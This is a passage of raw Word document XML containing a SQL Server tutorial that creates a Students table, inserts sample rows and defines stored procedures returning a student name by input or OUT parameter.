        <w:t>whose structure is given below:</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TABLE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w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>_Students</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Studentid</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>] [</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-keyword"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>int</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>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IDENTITY</w:t>
      </w:r>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1</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-digit"/>
          <w:rFonts w:ascii="Times New Roman" w:eastAsiaTheme="majorEastAsia" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>1</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NOT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NULL</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w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-keyword"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>nvarchar</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>](</w:t>
      </w:r>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NOT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NULL</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w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-keyword"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>nvarchar</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>](</w:t>
      </w:r>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NULL</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[Email] [</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-keyword"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>nvarchar</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>](</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-digit"/>
          <w:rFonts w:ascii="Times New Roman" w:eastAsiaTheme="majorEastAsia"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NULL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NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Support we insert the following data into the above table:</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w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-string"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="800080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>Vivek</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-string"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="800080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w: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w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-string"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="800080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>Johari</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-string"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="800080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w: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'vivek@abc.com'</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'Pankaj'</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'Kumar'</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'pankaj@abc.com'</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'Amit'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'Singh'</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'amit@abc.com'</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'Manish'</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'Kumar'</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w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-string"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="800080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>manish@abc.comm</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-string"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="800080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>'</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w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-string"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="800080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>Abhishek</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-string"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="800080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w: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'Singh'</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'abhishek@abc.com'</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>)</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Now, while writing a Stored Procedure, the first step will be to write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Create Procedure</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:color w:val="990000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>statement as the first statement:</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Procedure</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> Procedure-name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Input </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>parameters ,</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Output Parameters (</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-keyword"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>If</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> required)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Sql</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> statement used </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-keyword"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>in</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> the stored </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-keyword"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>procedure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End</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Now, suppose we need to create a Stored Procedure which will return a</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student</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>name whose</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="990000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>studentid</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:color w:val="990000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>is given as the input parameter to the stored procedure. Then, the Stored Procedure will be:</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comment"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="008000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-comment"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="008000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t xml:space="preserve">*  </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-comment"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="008000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>Getstudentname</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-comment"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="008000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> is the name of the stored procedure*/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PROCEDURE</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w:t>
      </w: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--Input </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-comment"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="008000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>parameter ,</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-comment"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="008000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-comment"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="008000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>Studentid</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-comment"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="008000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> of the student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lastRenderedPageBreak/>
        <w:t>SELECT</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 '</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WHERE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studentid</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END</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We can also collect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student</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:color w:val="990000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>name in the output parameter of the Stored Procedure. For example:</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proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-comment"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="008000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>GetstudentnameInOutputVariable</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-comment"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="008000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> is the name of the stored procedure which</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proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-comment"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="008000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>uses</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-comment"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="008000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> output variable @</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-comment"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="008000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>Studentname</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-comment"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="008000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> to collect the student name returns by the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proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-comment"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="008000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>stored</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-comment"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="008000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> procedure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comment"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="008000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>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PROCEDURE</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GetstudentnameInOutputVariable</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w:t>
      </w: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--Input </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-comment"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="008000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>parameter ,</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-comment"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="008000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-comment"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="008000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>Studentid</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-comment"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="008000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> of the student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studentname</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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VARCHAR</w:t>
      </w:r>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 xml:space="preserve">)  OUT        </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-comment"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="008000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t xml:space="preserve">-- </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-comment"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="008000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>Out</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-comment"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="008000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> parameter declared with the help of OUT keyword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SELECT</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 '</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WHERE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studentid</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END</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:after="0"/>
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>Note:-/* */</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
